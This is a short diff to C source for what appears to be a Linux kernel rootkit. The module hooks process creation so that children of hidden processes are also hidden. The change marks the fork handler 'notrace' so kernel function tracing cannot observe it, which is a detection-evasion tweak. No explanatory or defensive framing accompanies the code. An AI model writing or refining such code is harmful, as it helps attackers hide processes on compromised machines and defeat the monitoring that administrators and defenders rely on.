@@ -12,7 +12,7 @@ static struct kprobe kp = {
 
 static unsigned long (*_kallsyms_lookup_name)(const char *name);
 
-static void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
+notrace static void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
 {
     if (is_hidden_pid(parent->pid) || is_child_pid(parent->pid))
 	add_child_pid(child->pid);
